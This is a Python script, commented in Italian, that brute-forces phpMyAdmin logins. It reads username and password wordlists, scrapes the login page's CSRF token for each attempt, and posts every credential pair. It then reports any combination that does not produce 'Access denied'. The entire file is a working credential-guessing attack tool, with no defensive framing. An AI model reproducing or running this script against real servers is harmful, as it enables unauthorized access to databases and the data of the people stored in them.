import requests
from bs4 import BeautifulSoup

# Funzione per ottenere il token dal sito web
def ottieni_token(url):
    try:
        # Effettua una richiesta GET all'URL fornito
        risposta = requests.get(url)
        if risposta.status_code == 200:
            # Se la risposta è positiva, analizza il contenuto HTML
            soup = BeautifulSoup(risposta.text, 'html.parser')
            # Trova l'input con il nome 'token' e ottieni il suo valore
            token = soup.find('input', {'name': 'token'})['value']
            return token
        else:
            # Se lo status code non è 200, stampa un messaggio di errore
            print("Attenzione! C'è un errore", risposta.status_code)
            return None
    except requests.exceptions.RequestException as e:
        # Gestisce eccezioni durante la richiesta
        print("Errore nella richiesta del token:", e)
        return None

# Funzione principale
def main():
    # Chiede all'utente di inserire i file di username e password e l'URL di phpMyAdmin
    usernames_file = input("\nInserisci il file contenente gli usernames: ")
    passwords_file = input("\nInserisci il file contenente le password: ")
    url = input("Inserisci url phpMyAdmin: ").rstrip('/') + '/'
    
    try:
        # Legge il file degli username
        with open(usernames_file) as file_utenti:
            lista_utenti = file_utenti.readlines()
        # Legge il file delle password
        with open(passwords_file) as file_passwords:
            lista_password = file_passwords.readlines()
            
            # Prova ogni combinazione di username e password
            for username in lista_utenti:
                username = username.rstrip()

                for password in lista_password:
                    password = password.rstrip()

                    # Ottiene il token di sessione
                    token = ottieni_token(url)
                    login = {'pma_username': username, 'pma_password': password, 'token': token}

                    try:
                        # Effettua una richiesta POST con i dati di login
                        risposta = requests.post(url, data=login)
                        print(f"\n\nProvo con: {username} e {password}")

                        if risposta.status_code == 200:
                            if 'Access denied' in risposta.text:
                                # Se l'accesso è negato, stampa un messaggio
                                print(f"Login Fallito. (token di sessione: {token})\n\n")
                            else:
                                # Se l'accesso è concesso, stampa un messaggio di successo
                                print(f"Accesso trovato con: {username} e {password}. Token: {token}\n\n")
                        else:
                            # Se lo status code non è 200, stampa un messaggio di errore
                            print("Errore", risposta.status_code)
                    except requests.exceptions.RequestException as e:
                        # Gestisce eccezioni durante la richiesta
                        print("Errore nella richiesta: ", e)
    except FileNotFoundError:
        # Gestisce eccezioni se i file non vengono trovati
        print("Controlla il percorso dei file")

# Esegue la funzione principale
if __name__ == "__main__":
    main()
